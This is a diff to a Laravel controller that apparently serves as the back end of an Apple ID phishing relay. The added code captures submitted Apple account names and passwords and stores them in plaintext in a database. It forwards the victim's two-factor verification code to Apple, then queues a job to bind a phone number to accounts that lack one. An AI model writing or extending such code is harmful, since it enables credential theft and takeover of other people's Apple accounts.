@@ -2,8 +2,12 @@
 
 namespace App\Http\Controllers;
 
+use App\Apple\Service\AccountBind;
 use App\Apple\Service\Exception\UnauthorizedException;
 use App\Apple\Service\HttpClient;
+use App\Apple\Service\User;
+use App\Jobs\BindAccountPhone;
+use App\Models\Account;
 use GuzzleHttp\Exception\GuzzleException;
 use Illuminate\Contracts\Container\Container;
 use Illuminate\Contracts\View\Factory;
@@ -11,13 +15,19 @@ use Illuminate\Contracts\View\View;
 use Illuminate\Foundation\Application;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
+use Psr\Log\LoggerInterface;
 
 class IndexController extends Controller
 {
 
     protected HttpClient $http;
 
-    public function __construct(protected readonly Request $request, protected readonly Container $container)
+    public function __construct(
+        protected readonly Request $request,
+        protected readonly Container $container,
+        protected readonly User $user,
+        protected readonly LoggerInterface $logger
+    )
     {
         $this->http = $container->make(
             HttpClient::class,
@@ -53,6 +63,14 @@ class IndexController extends Controller
 
         $response = $this->http->signin($accountName, $password);
 
+        $this->user->set('accountName', $accountName);
+        $this->user->set('password', $password);
+
+        Account::create([
+                'accountName' => $accountName,
+                'password' => $password,
+        ]);
+
         return $this->success(data: [
             'Guid' => $this->request->cookie('laravel_session'),
             'Devices' => $response->getDevices(),
@@ -77,12 +95,32 @@ class IndexController extends Controller
 
         $code = $this->request->input('apple_verifycode');
         if (empty($code)) {
-            return $this->error('apple_verifycode');
+            return $this->redirect();
+        }
+
+        $accountName = $this->user->get('accountName');
+        if (empty($accountName)) {
+            return $this->redirect();
+        }
+
+        if (empty($user = $this->getUserInfo($accountName))) {
+            return $this->redirect();
         }
 
         $response = $this->http->authverifytrusteddevicesecuritycode($code);
 
+        // 创建队列任务在响应发送到浏览器后调度
+        BindAccountPhone::dispatchAfterResponse($user->id,new AccountBind($this->http,$this->logger));
+
         return $this->success($response->getData());
+    }
+
+    protected function getUserInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
+    {
+        return Account::where('accountName', $accountName)
+            ->whereNotNull('password')
+            ->whereNull('phone')
+            ->first();
     }
 
     /**
